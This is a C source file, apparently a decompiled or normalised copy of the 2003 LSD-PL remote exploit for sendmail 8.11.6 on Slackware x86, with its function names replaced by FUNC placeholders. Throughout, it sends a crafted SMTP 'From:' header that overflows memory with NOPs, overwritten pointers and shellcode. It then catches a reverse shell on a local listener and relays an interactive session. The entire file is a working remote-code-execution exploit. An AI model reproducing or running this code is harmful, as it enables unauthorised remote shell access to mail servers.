#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct timeval {int tv_sec; scalar_t__ tv_usec; } ;
struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; void* sin_port; void* sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {int /*<<< orphan*/  h_addr; } ;
typedef  int /*<<< orphan*/  fd_set ;
typedef  int /*<<< orphan*/  address ;

/* Variables and functions */
 void* AF_INET ; 
 int /*<<< orphan*/  FUNC0 (int,int) ; 
 scalar_t__ EAGAIN ; 
 scalar_t__ EWOULDBLOCK ; 
 scalar_t__ FUNC1 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ *) ; 
 int FUNC4 (int) ; 
 int MAXLINE ; 
 int MPTR ; 
 int /*<<< orphan*/  NOP ; 
 int OFF2 ; 
 int OFF3 ; 
 int PNUM ; 
 int PTR ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int FUNC5 (int,struct sockaddr*,int*) ; 
 int FUNC6 (char*) ; 
 int FUNC7 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC8 (struct sockaddr_in*,int) ; 
 int /*<<< orphan*/  FUNC9 (int) ; 
 int FUNC10 (int,struct sockaddr*,int) ; 
 scalar_t__ errno ; 
 int /*<<< orphan*/  FUNC11 (int) ; 
 int /*<<< orphan*/  FUNC12 (int /*<<< orphan*/ ) ; 
 int FUNC13 (int,int,int) ; 
 int FUNC14 (int,int,int,int) ; 
 int FUNC15 (int) ; 
 int /*<<< orphan*/  FUNC16 (int /*<<< orphan*/ ) ; 
 struct hostent* FUNC17 (char*) ; 
 int FUNC18 (int,char**,char*) ; 
 void* FUNC19 (int) ; 
 int FUNC20 (char*) ; 
 int /*<<< orphan*/  FUNC21 (char*,int) ; 
 int /*<<< orphan*/  FUNC22 () ; 
 int FUNC23 (int,int) ; 
 int /*<<< orphan*/  lookup ; 
 int /*<<< orphan*/  FUNC24 (int*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC25 (char*,int /*<<< orphan*/ ,int) ; 
 char* optarg ; 
 int /*<<< orphan*/  FUNC26 (char*,...) ; 
 int /*<<< orphan*/  FUNC27 (char*,int) ; 
 int FUNC28 (int,char*,int) ; 
 scalar_t__ FUNC29 (int,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,struct timeval*) ; 
 int /*<<< orphan*/  FUNC30 (int,char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/ * shellcode ; 
 int FUNC31 (void*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC32 (char*,char*,char*) ; 
 int /*<<< orphan*/  FUNC33 (char*,char*,int*) ; 
 int /*<<< orphan*/  stdout ; 
 int FUNC34 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC35 (int) ; 
 int /*<<< orphan*/  FUNC36 (int,char*,int) ; 

int FUNC37(int argc,char **argv){
    int sck,srv,i,j,cnt,jidx,aidx,sidx,fidx,aptr,sptr,fptr,ssize,fsize,jmp;
    int c,l,i1,i2,i3,i4,found,vers=80,count=256,timeout=1,port=25;
    fd_set readfs;
    struct timeval t;
    struct sockaddr_in address;
    struct hostent *hp;
    char buf[4096],cmd[4096];
    char *p,*host,*myhost=NULL;

    FUNC26("copyright LAST STAGE OF DELIRIUM mar 2003 poland //lsd-pl.net/\n");
    FUNC26("sendmail 8.11.6 for Slackware 8.0 x86\n\n");

    if (argc<3) {
     FUNC26("usage: %s target [-l localaddr] [-b localport] [-p ptr] [-c count] [-t timeout] [-v 80]\n",argv[0]);
     FUNC11(-1);
    }

    while((c=FUNC18(argc-1,&argv[1],"b:c:l:p:t:v:"))!=-1) {
     switch(c) {
      case 'b': port=FUNC6(optarg);break;
      case 'c': count=FUNC6(optarg);break;
      case 'l': myhost=optarg;break;
      case 't': timeout=FUNC6(optarg);break;
      case 'v': vers=FUNC6(optarg);break;
      case 'p': FUNC33(optarg,"%x",&MPTR);
     }
    }

    host=argv[1];

    srv=FUNC31(AF_INET,SOCK_STREAM,0);
    FUNC8(&address,sizeof(address));
    address.sin_family=AF_INET;
    address.sin_port=FUNC19(port);
    if (FUNC7(srv,(struct sockaddr*)&address,sizeof(address))==-1) {
     FUNC26("error: bind\n");FUNC11(-1);
    }
    if (FUNC23(srv,10)==-1) {
     FUNC26("error: listen\n");FUNC11(-1);
    }

    FUNC21(myhost,port);

    for(i4=0;i4<count;i4++,MPTR+=cnt*4) {
     PTR=MPTR;
     sck=FUNC31(AF_INET,SOCK_STREAM,0);
     FUNC8(&address,sizeof(address));
     address.sin_family=AF_INET;
     address.sin_port=FUNC19(25);
     if ((address.sin_addr.s_addr=FUNC20(host))==-1) {
      if ((hp=FUNC17(host))==NULL) {
       FUNC26("error: address\n");FUNC11(-1);
      }
      FUNC24(&address.sin_addr.s_addr,hp->h_addr,4);
     }
     if (FUNC10(sck,(struct sockaddr*)&address,sizeof(address))==-1) {
      FUNC26("error: connect\n");FUNC11(-1);
     }
     FUNC22();

     FUNC30(sck,"helo yahoo.com\n",0);
     FUNC30(sck,"mail from: anonymous@yahoo.com\n",0);
     FUNC30(sck,"rcpt to: lp\n",0);
     FUNC30(sck,"data\n",0);

     aidx=FUNC13(PTR,PNUM*4,1);
     FUNC0(aidx,PNUM*4);
     aptr=FUNC4(aidx);

     FUNC26(".");FUNC12(stdout);

     jidx=FUNC13(PTR,FUNC34(shellcode)+PNUM*4,1);
     FUNC0(jidx,FUNC34(shellcode)+PNUM*4);

     switch(vers) {
      case 80: l=28;i1=0x46;i2=0x94;i3=0x1c;break;
      default: FUNC11(-1);
     }

     i2-=8;

     p=buf;
     for(i=0;i<138;i++) {
      *p++='<';*p++='>';
     }
     *p++='(';
     for(i=0;i<l;i++) *p++=NOP;
     *p++=')';
     *p++=0;

     FUNC27(&buf[OFF3+l],aptr);
     FUNC32(cmd,"From: %s\n",buf);
     FUNC30(sck,cmd,0);
     FUNC30(sck,"Subject: hello\n",0);
     FUNC25(cmd,NOP,MAXLINE);
     cmd[MAXLINE-2]='\n';
     cmd[MAXLINE-1]=0;

     cnt=0;

     while(cnt<PNUM) {
      sptr=aptr;
      fptr=FUNC4(OFF2);

      if (!(sidx=FUNC15(sptr))) break;
      sptr=FUNC4(sidx);
      if (!(fidx=FUNC14(fptr,i1,i2,i3))) break;
      fptr=FUNC4(fidx);

      jmp=FUNC4(jidx);
      while (!FUNC35(jmp)) jmp+=4;

      FUNC27(&cmd[aidx],sptr);
      FUNC27(&cmd[sidx+0x24],aptr);
      FUNC27(&cmd[sidx+0x28],aptr);
      FUNC27(&cmd[sidx+0x18],fptr-i2-i3);

      FUNC27(&cmd[fidx-i2-i3],0x01010101);
      FUNC27(&cmd[fidx-i2-i3+i1],0xfffffff8);

      FUNC27(&cmd[fidx-i3],fptr-i3);
      FUNC27(&cmd[fidx],jmp);

      aidx+=4;
      PTR-=4;
      cnt++;
     }

     p=&cmd[jidx+4*PNUM];
      for(i=0;i<FUNC34(shellcode);i++) {
      *p++=shellcode[i];
     }
     FUNC30(sck,cmd,0);
     FUNC30(sck,"\n",0);
     FUNC30(sck,".\n",0);
     FUNC16(lookup);

     FUNC3(&readfs);
     FUNC2(0,&readfs);
     FUNC2(srv,&readfs);

     t.tv_sec=timeout;
     t.tv_usec=0;

     if (FUNC29(srv+1,&readfs,NULL,NULL,&t)>0) {
      FUNC9(sck);
      found=1;
      if ((sck=FUNC5(srv,(struct sockaddr*)&address,&l))==-1) {
        FUNC26("error: accept\n");FUNC11(-1);
      }
      FUNC9(srv);

      FUNC26("\nbase 0x%08x mcicache 0x%08x\n",PTR,aptr);

      FUNC36(sck,"/bin/uname -a\n",14);
     } else {
      FUNC9(sck);
      found=0;
     }

     while(found){
        FUNC3(&readfs);
        FUNC2(0,&readfs);
        FUNC2(sck,&readfs);
        if(FUNC29(sck+1,&readfs,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FUNC1(0,&readfs)){
                if((cnt=FUNC28(0,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                     else {FUNC26("koniec\n");FUNC11(-1);}
                }
                FUNC36(sck,buf,cnt);
            }
            if(FUNC1(sck,&readfs)){
                if((cnt=FUNC28(sck,buf,1024))<1){
                     if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                     else {FUNC26("koniec\n");FUNC11(-1);}
                }
                FUNC36(1,buf,cnt);
            }
        }
    }
  }
}